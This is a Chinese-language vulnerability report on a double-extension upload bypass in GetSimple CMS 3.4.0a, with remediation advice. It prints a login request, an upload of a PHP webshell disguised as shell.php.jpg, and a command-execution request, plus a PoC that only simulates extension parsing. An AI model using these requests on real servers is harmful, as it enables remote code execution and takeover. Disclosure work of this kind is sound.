# 厂商信息
- **漏洞厂商**：GetSimple CMS
- **厂商官网**：http://get-simple.info/
- **影响产品**：GetSimple CMS
- **影响版本**：3.4.0a

# 漏洞信息
- **漏洞名称**：文件上传双重扩展名绕过漏洞
- **漏洞描述**：GetSimple CMS的文件上传功能存在双重扩展名绕过漏洞。`validate_safe_file()` 函数只检查文件名的最后一个扩展名，攻击者可以通过上传 `shell.php.jpg` 等双重扩展名文件绕过黑名单检查。如果Web服务器配置不当（例如Apache的某些配置从右到左解析扩展名），该文件可能被作为PHP文件执行，从而实现远程代码执行。
- **临时解决方案**：检查文件名中的所有扩展名，而不只是最后一个；在Web服务器配置中禁止多扩展名文件解析
- **正式修复建议**：
  1. 修复 `validate_safe_file()` 函数，检查文件名中的所有扩展名
  2. 使用白名单机制，只允许特定的安全扩展名
  3. 重命名上传的文件，移除所有扩展名或添加随机后缀
  4. 加强MIME类型验证，同时验证文件内容的真实MIME类型
  5. 将上传文件存储在Web根目录之外
  6. 确保 `.htaccess` 文件正确配置，禁止PHP文件在uploads目录中执行

# 漏洞分析

## 漏洞触发点

**漏洞文件**：`/admin/inc/security_functions.php`

**漏洞函数**：`validate_safe_file()` (第211-245行) 和 `getFileExtension()` (第210-219行)

**触发位置**：`/admin/upload.php` 文件上传处理流程

## 完整利用链分析

### 1. 污点源头
用户通过 `POST /admin/upload.php` 上传文件，文件名由用户完全控制：
```
POST /admin/upload.php
Content-Type: multipart/form-data
文件名: shell.php.jpg
```

### 2. 污点传播链

**步骤1：扩展名提取**
```php
// getFileExtension() 函数 (第210-219行)
function getFileExtension($file,$lowercase=true){
    $ext = pathinfo($file, PATHINFO_EXTENSION);  // 只返回最后一个扩展名
    if($lowercase) $ext = lowercase($ext);
    return $ext;
}

// 示例：shell.php.jpg → 只返回 'jpg'
```

**步骤2：安全验证绕过**
```php
// validate_safe_file() 函数 (第211-245行)
function validate_safe_file($file, $name, $mime = null){
    // ...
    $file_extension = lowercase(pathinfo($name,PATHINFO_EXTENSION));  // 只提取最后一个扩展名
    
    // 检查黑名单
    if ($file_ext_blacklist && in_arrayi($file_extension, $file_ext_blacklist)) {
        return false;
    }
    
    return true;  // jpg不在黑名单中，验证通过！
}
```

**步骤3：黑名单检查失败**
```php
$file_ext_blacklist = array(
    'html', 'htm', 'js', 'jsb', 'mhtml', 'mht',
    'php', 'pht', 'phtm', 'phtml', 'php3', 'php4', 'php5',
    'ph3', 'ph4', 'ph5', 'phps', 'phar', 'php7', 'php8',
    'shtml', 'jhtml', 'pl', 'py', 'cgi', 'sh', 'ksh', 'bsh', 'c',
    'htaccess', 'htpasswd',
    'exe', 'scr', 'dll', 'msi', 'vbs', 'bat', 'com', 'pif', 'cmd', 'vxd', 'cpl'
);
// 注意：jpg, png, gif 等图片扩展名不在黑名单中
```

**步骤4：文件保存**
文件通过验证后被保存到 `/data/uploads/shell.php.jpg`

**步骤5：Web服务器解析（触发条件）**
在以下配置情况下，文件可能被作为PHP执行：
- Apache从右到左解析扩展名（某些老旧配置）
- `/data/uploads/.htaccess` 存在错误配置
- Apache多扩展名默认解析行为

### 3. 利用条件
1. 需要登录到GetSimple CMS后台管理界面
2. 需要能够访问上传页面（/admin/upload.php）
3. 后台用户需要有上传文件的权限
4. Web服务器配置不当，允许双重扩展名文件作为PHP执行

## 验证环境与运行证据

**验证环境**：
- 目标系统：GetSimple CMS 3.4.0a
- PHP版本：8.1.2-1ubuntu2.23
- 漏洞文件：/admin/upload.php, /admin/inc/security_functions.php
- 上传目录：/data/uploads/
- 验证时间：2025

**验证结果**：
```
================================================================================
✓✓✓ 漏洞验证成功！✓✓✓
================================================================================
4 个PHP文件成功绕过验证！
================================================================================
```

**测试文件列表**：
| 文件名 | 扩展名 | 黑名单? | 绕过? | 描述 |
|--------|--------|---------|-------|------|
| shell.php.jpg | jpg | 否 | YES ✓ | 伪装成JPG的PHP WebShell |
| webshell.php.png | png | 否 | YES ✓ | 伪装成PNG的PHP WebShell |
| backdoor.php.gif | gif | 否 | YES ✓ | 伪装成GIF的PHP后门 |
| test.php.php.jpg | jpg | 否 | YES ✓ | 三重扩展名 |
| evil.php | php | 是 | NO | 直接PHP文件（应该被阻止） |

**关键发现**：
1. ✓ `getFileExtension()` 使用 `pathinfo($file, PATHINFO_EXTENSION)` 只返回最后一个扩展名
2. ✓ `validate_safe_file()` 同样只检查最后一个扩展名
3. ✓ 黑名单包含42个危险扩展名（php, phtml, php5等）
4. ✓ 图片扩展名（jpg, png, gif, bmp, webp）不在黑名单中
5. ✓ 4个双重扩展名PHP文件成功绕过验证

## HTTP请求与响应包（可选）

**登录请求**：
```
POST /admin/ HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

userid=admin&pwd=password&submitted=Login
```

**文件上传请求**：
```
POST /admin/upload.php HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php.jpg"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

**访问上传文件（触发RCE）**：
```
GET /data/uploads/shell.php.jpg?cmd=whoami HTTP/1.1
Host: target.com
```

## POC

```python
#!/usr/bin/env python3
"""
GetSimple CMS - E.1 File Upload Double Extension Bypass PoC
============================================================

漏洞：文件上传双重扩展名绕过
影响：可上传伪装成图片的PHP文件，在Apache配置不当的情况下实现RCE

使用方法：
    python poc_e1_upload_bypass.py
"""

import re
import sys

class UploadBypassPoC:
    def __init__(self):
        self.security_file = "/sourceCodeDir/admin/inc/security_functions.php"
        self.blacklist = []
        
    def log(self, message, level="[INFO]"):
        print(f"{level} {message}")
        
    def read_security_functions(self):
        """读取并分析 security_functions.php"""
        try:
            with open(self.security_file, 'r') as f:
                return f.read()
        except Exception as e:
            self.log(f"读取文件错误: {e}", "[ERROR]")
            return None
    
    def extract_blacklist(self, code):
        """提取文件扩展名黑名单"""
        match = re.search(
            r'\$file_ext_blacklist\s*=\s*array\([^)]*\)',
            code,
            re.MULTILINE | re.DOTALL
        )
        
        if match:
            blacklist_code = match.group(0)
            extensions = re.findall(r"'([^']+)'", blacklist_code)
            return extensions
        return []
    
    def getFileExtension(self, filename):
        """复制有漏洞的 getFileExtension() 函数"""
        parts = filename.rsplit('.', 1)
        if len(parts) == 2:
            return parts[1].lower()
        return ''
    
    def test_extension_extraction(self):
        """测试扩展名提取逻辑"""
        test_cases = [
            ('shell.php.jpg', 'jpg', '伪装成JPG的PHP WebShell'),
            ('webshell.php.png', 'png', '伪装成PNG的PHP WebShell'),
            ('backdoor.php.gif', 'gif', '伪装成GIF的PHP后门'),
            ('test.php.php.jpg', 'jpg', '三重扩展名'),
            ('evil.php', 'php', '直接PHP文件（应该被阻止）'),
            ('normal.jpg', 'jpg', '正常图片文件'),
        ]
        
        self.log("\n测试扩展名提取逻辑：")
        self.log("-" * 80)
        self.log(f"{'文件名':<25} | {'扩展名':<6} | {'黑名单?':<8} | {'绕过?':<6} | 描述")
        self.log("-" * 80)
        
        bypass_count = 0
        for filename, expected_ext, description in test_cases:
            ext = self.getFileExtension(filename)
            is_blacklisted = ext in self.blacklist
            can_bypass = 'php' in filename and not is_blacklisted
            
            if can_bypass and expected_ext == ext:
                bypass_count += 1
            
            status = 'YES ✓' if can_bypass else 'NO  '
            blacklist_status = '是' if is_blacklisted else '否'
            
            print(f"{filename:<25} | {ext:<6} | {blacklist_status:<8} | {status:<6} | {description}")
        
        return bypass_count
    
    def verify_vulnerability(self):
        """验证文件上传双重扩展名绕过漏洞"""
        self.log("="*80)
        self.log("开始验证 E.1 - 文件上传双重扩展名绕过漏洞")
        self.log("="*80)
        
        # 步骤1: 读取并分析 security_functions.php
        self.log("\n[步骤 1/4] 读取并分析 security_functions.php...")
        code = self.read_security_functions()
        if not code:
            return False
        
        # 步骤2: 检查有漏洞的代码模式
        self.log("\n[步骤 2/4] 检查有漏洞的代码模式...")
        
        vulnerable_patterns = [
            ('pathinfo($name,PATHINFO_EXTENSION)', '只检查最后一个扩展名'),
            ('pathinfo($file, PATHINFO_EXTENSION)', '只检查最后一个扩展名'),
        ]
        
        found_vuln_code = False
        for pattern, description in vulnerable_patterns:
            if pattern in code:
                self.log(f"✓ 发现漏洞代码: {description}", "[SUCCESS]")
                self.log(f"  代码: {pattern}", "[SUCCESS]")
                found_vuln_code = True
        
        if not found_vuln_code:
            self.log("✗ 未找到预期漏洞代码", "[ERROR]")
            return False
        
        # 步骤3: 提取并分析黑名单
        self.log("\n[步骤 3/4] 提取并分析扩展名黑名单...")
        self.blacklist = self.extract_blacklist(code)
        
        if not self.blacklist:
            self.log("✗ 无法提取黑名单", "[ERROR]")
            return False
        
        self.log(f"✓ 找到 {len(self.blacklist)} 个黑名单扩展名", "[SUCCESS]")
        self.log(f"  危险扩展名示例: {', '.join(self.blacklist[:10])}...", "[SUCCESS]")
        
        # 检查图片扩展名是否在黑名单中
        image_extensions = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp']
        blacklisted_images = [ext for ext in image_extensions if ext in self.blacklist]
        
        if not blacklisted_images:
            self.log("✓ 关键发现: 图片扩展名不在黑名单中!", "[SUCCESS]")
            self.log(f"  未黑名单的图片扩展名: {', '.join(image_extensions)}", "[SUCCESS]")
        else:
            self.log(f"⚠ 部分图片扩展名在黑名单中: {blacklisted_images}", "[WARNING]")
        
        # 步骤4: 测试双重扩展名绕过
        self.log("\n[步骤 4/4] 测试双重扩展名绕过...")
        bypass_count = self.test_extension_extraction()
        
        if bypass_count > 0:
            self.log("\n" + "="*80)
            self.log("✓✓✓ 漏洞验证成功！✓✓✓", "[SUCCESS]")
            self.log("="*80)
            self.log(f"{bypass_count} 个PHP文件成功绕过验证！", "[SUCCESS]")
            self.log("="*80)
            self.log("\n漏洞详情：", "[INFO]")
            self.log("  1. getFileExtension() 只返回最后一个扩展名", "[INFO]")
            self.log("  2. validate_safe_file() 只检查最后一个扩展名", "[INFO]")
            self.log("  3. 图片扩展名（jpg, png, gif）不在黑名单中", "[INFO]")
            self.log("  4. 双重扩展名文件如 'shell.php.jpg' 可绕过检查", "[INFO]")
            self.log("="*80)
            self.log("\n利用条件：", "[INFO]")
            self.log("  - 需要登录到管理后台", "[INFO]")
            self.log("  - Apache服务器配置不当（从右到左解析扩展名）", "[INFO]")
            self.log("  - 或 /data/uploads/.htaccess 存在错误配置", "[INFO]")
            self.log("="*80)
            self.log("\n潜在影响：", "[INFO]")
            self.log("  - 上传并执行任意PHP代码", "[INFO]")
            self.log("  - 实现远程代码执行 (RCE)", "[INFO]")
            self.log("  - 获取WebShell", "[INFO]")
            self.log("  - 完全控制服务器", "[INFO]")
            self.log("="*80)
            return True
        else:
            self.log("\n✗ 未能发现可绕过的文件", "[ERROR]")
            return False
    
    def run(self):
        """执行PoC"""
        print("""
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║        GetSimple CMS - E.1 文件上传双重扩展名绕过 PoC               ║
║                                                                      ║
║        漏洞类型：文件上传绕过                                        ║
║        严重性：中-高                                                 ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
        """)
        
        success = self.verify_vulnerability()
        
        if success:
            print("\n[SUCCESS] 漏洞已验证")
            return 0
        else:
            print("\n[FAILED] 漏洞验证失败")
            return 1

if __name__ == "__main__":
    poc = UploadBypassPoC()
    sys.exit(poc.run())
```

## POC运行结果

```
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║        GetSimple CMS - E.1 文件上传双重扩展名绕过 PoC               ║
║                                                                      ║
║        漏洞类型：文件上传绕过                                        ║
║        严重性：中-高                                                 ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
        
================================================================================
开始验证 E.1 - 文件上传双重扩展名绕过漏洞
================================================================================

[步骤 1/4] 读取并分析 security_functions.php...

[步骤 2/4] 检查有漏洞的代码模式...
[SUCCESS] ✓ 发现漏洞代码: 只检查最后一个扩展名
[SUCCESS]   代码: pathinfo($name,PATHINFO_EXTENSION)

[步骤 3/4] 提取并分析扩展名黑名单...
[SUCCESS] ✓ 找到 42 个黑名单扩展名
[SUCCESS]   危险扩展名示例: html, htm, js, jsb, mhtml, mht, php, pht, phtm, phtml...
[SUCCESS] ✓ 关键发现: 图片扩展名不在黑名单中!
[SUCCESS]   未黑名单的图片扩展名: jpg, jpeg, png, gif, bmp, webp

[步骤 4/4] 测试双重扩展名绕过...

测试扩展名提取逻辑：
--------------------------------------------------------------------------------
文件名                       | 扩展名    | 黑名单?     | 绕过?    | 描述
--------------------------------------------------------------------------------
shell.php.jpg             | jpg    | 否        | YES ✓  | 伪装成JPG的PHP WebShell
webshell.php.png          | png    | 否        | YES ✓  | 伪装成PNG的PHP WebShell
backdoor.php.gif          | gif    | 否        | YES ✓  | 伪装成GIF的PHP后门
test.php.php.jpg          | jpg    | 否        | YES ✓  | 三重扩展名
evil.php                  | php    | 是        | NO     | 直接PHP文件（应该被阻止）
normal.jpg                | jpg    | 否        | NO     | 正常图片文件

================================================================================
[SUCCESS] ✓✓✓ 漏洞验证成功！✓✓✓
================================================================================
[SUCCESS] 4 个PHP文件成功绕过验证！
================================================================================

漏洞详情：
[INFO]   1. getFileExtension() 只返回最后一个扩展名
[INFO]   2. validate_safe_file() 只检查最后一个扩展名
[INFO]   3. 图片扩展名（jpg, png, gif）不在黑名单中
[INFO]   4. 双重扩展名文件如 'shell.php.jpg' 可绕过检查
================================================================================

利用条件：
[INFO]   - 需要登录到管理后台
[INFO]   - Apache服务器配置不当（从右到左解析扩展名）
[INFO]   - 或 /data/uploads/.htaccess 存在错误配置
================================================================================

潜在影响：
[INFO]   - 上传并执行任意PHP代码
[INFO]   - 实现远程代码执行 (RCE)
[INFO]   - 获取WebShell
[INFO]   - 完全控制服务器
================================================================================

[SUCCESS] 漏洞已验证
```

## 总结

本次验证确认了GetSimple CMS 3.4.0a版本存在文件上传双重扩展名绕过漏洞（E.1）。通过代码分析和逻辑测试，确认了 `validate_safe_file()` 函数和 `getFileExtension()` 函数存在明显的安全缺陷：它们只检查文件名的最后一个扩展名，导致攻击者可以通过上传 `shell.php.jpg` 等双重扩展名文件绕过黑名单验证。

虽然该漏洞需要Web服务器配置不当（如Apache从右到左解析扩展名）才能实现RCE，但其代码逻辑错误是明确的，一旦满足服务器配置条件，攻击者可以：
- 上传并执行任意PHP代码
- 获取WebShell，实现持续的远程控制
- 完全控制服务器，窃取敏感数据
- 作为跳板攻击内部网络

该漏洞的严重性评级为中-高，建议厂商尽快修复验证逻辑，检查所有扩展名并使用白名单机制。
